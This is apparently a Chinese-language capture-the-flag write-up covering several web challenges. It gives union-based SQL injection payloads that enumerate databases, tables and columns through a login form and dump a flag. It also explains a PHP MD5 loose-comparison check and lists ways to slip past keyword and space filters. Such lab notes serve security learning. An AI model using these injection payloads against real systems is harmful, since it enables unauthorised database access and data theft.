  • select 个数

  • 回显位置（数据库名

  • 爆数据库

    username=admin' or 1=1 union select 1,group_concat(schema_name),3 from information_schema.schemata # &password=123456

 "union": 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。

"select": 这是SQL语言中的一个关键字，表示从数据库中选择数据。

"1": 这是一个常量值，代表一个整数。

"group_concat": 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。

"schema_name": 这是"information_schema.schemata"表中的一列，代表数据库名称。

"information_schema.schemata": 这是MySQL数据库中的一个系统数据库表，包含数据库信息。

"3": 这是一个常量值，代表一个整数

  • 爆表

    username=admin' or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables # &password=123456

  • 指定数据库的爆表

    username=admin' or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="web2" # &password=123456

  • 爆列

    username=admin' or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name ='flag' and table_schema='web2'  # &password=123456

  • flag

    username=admin' or 1=1 union select 1,flag,3 from flag # &password=123456

web5（Md5绕过）

  • 代码解释

    <?php：这是 PHP 代码的起始标记，它告诉 PHP 解释器该文件包含 PHP 代码。
 $flag=""：这创建了一个名为 $flag 的变量，并将其初始值设置为空字符串。
 $v1=$_GET['v1']：这将 GET 请求中的 v1 参数的值赋给变量 $v1。
 $v2=$_GET['v2']：这将 GET 请求中的 v2 参数的值赋给变量 $v2。
 if(isset($v1) && isset($v2)){}：这个条件语句检查变量 $v1 和 $v2 是否都已经设置，如果是则执行条件语句块中的代码。
 if(!ctype_alpha($v1))：这个条件语句检查 $v1 变量中是否只包含字母，如果不是，执行条件语句块中的代码，输出 "v1 error" 并终止脚本的执行。
 if(!is_numeric($v2))：这个条件语句检查 $v2 变量是否是一个数字，如果不是，执行条件语句块中的代码，输出 "v2 error" 并终止脚本的执行。
 if(md5($v1)==md5($v2))：这个条件语句检查 $v1 和 $v2 的 md5 哈希值是否相同，如果是，执行条件语句块中的代码，输出 $flag 变量的值。
 echo $flag;：这个语句将 $flag 变量的值输出到客户端。
 }else{}：如果 if 语句中的条件没有被满足，执行这个 else 语句块中的代码。
 echo "where is flag?";：这个语句输出 "where is flag?"，表示在缺少 GET 请求参数的情况下无法找到 flag 值。
 ?>：这是 PHP 代码的结束标记，告诉 PHP 解释器该文件的 PHP 代码部分已经结束。

Web6：sql注入（空格绕过）

  • 页面

  • 表单

  • sql注入

  • 考虑

    • 关键字过滤
    • 空格过滤
    
SQL注入是一种利用Web应用程序对用户输入的数据没有进行充分过滤，从而构造恶意的SQL语句执行攻击者想要的操作的技术³。

关键字过滤是指Web应用程序对用户输入的数据进行检查，如果发现包含了一些敏感的SQL关键字，如union、select、drop等，就拒绝执行或者删除这些关键字¹。

空格过滤是指Web应用程序对用户输入的数据进行检查，如果发现包含了空格字符，就拒绝执行或者删除空格字符。这是因为一些SQL语句需要使用空格来分隔不同的部分²。

绕过关键字过滤和空格过滤的方法有很多，比如使用SQL注释符号（/**/）、使用十六进制编码（0x）、使用内置函数（char()）等¹⁴。具体的方法要根据不同的数据库和情况来选择。
